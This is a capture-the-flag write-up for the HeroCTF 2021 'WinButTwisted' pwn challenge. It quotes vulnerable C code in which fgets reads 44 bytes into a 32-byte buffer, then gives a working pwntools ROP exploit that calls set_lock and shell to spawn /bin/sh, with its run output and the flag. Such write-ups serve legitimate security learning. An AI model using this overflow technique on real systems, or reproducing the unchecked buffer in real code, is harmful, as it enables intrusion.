
In *WinButTwisted.c*, if ``UNLOCKED`` is set to 1, function *shell* invokes *system* to launch a shell. But *shell* is not invoked.

```c
void set_lock()
{
    printf("Setting lock !");
    UNLOCKED = 1;
}

void shell()
{
    printf("In shell function ! ");
    if (UNLOCKED == 1)
    {
        printf("Getting shell ! ");
        setreuid(geteuid(), geteuid());
        system("/bin/sh");
    }
}
```

In *main*, it allows to input 44 bytes, but the buffer can takes up to 32 bytes, so here is a vulnerability. We overflow the buffer and make it jump to *set_lock* to set *UNLOCKED*, return to function *shell* to get shell.

```c
int main()
{
    int (*look)() = look_like;
    int (*hello)() = hello_hero;
    char buffer[32];

    printf("What would a hero say ?\n>>> ");
    fgets(buffer, 44, stdin);
    hello();
    look();

}
```

Use *De Bruijn cyclic pattern* it's easy to find out the padding is 32 bytes, here is the exploit.

```python
host = "pwn.heroctf.fr"
port = 9003
target = "WinButTwisted"

def exploit():
    pr = pwn.connect(host, port)
    elf = pwn.ELF(target)
    rop = pwn.ROP(elf)

    payload = b"A" * 32
    rop.set_lock()
    rop.shell()
    payload += rop.chain()
    print('len:', len(payload), payload)
    pr.sendlineafter("What would a hero say ?\n>>> ", payload)
    print(pr.readall(2))

exploit()
```

```bash
$ py3 exploit.py 
[+] Opening connection to pwn.heroctf.fr on port 9003: Done
[*] '/home/zex/lab_ex/hacking-lab/heroctf-2021/win-but-twisted/WinButTwisted'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[*] Loaded 72 cached gadgets for 'WinButTwisted'
len: 40 b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAe\x99\x04\x08\x99\x99\x04\x08'
[+] Receiving all data: Done (62B)
[*] Closed connection to pwn.heroctf.fr port 9003
b'Setting lock !In shell function ! Hero{Tw1sT3D_w1N_FuNcTi0N}  '
```
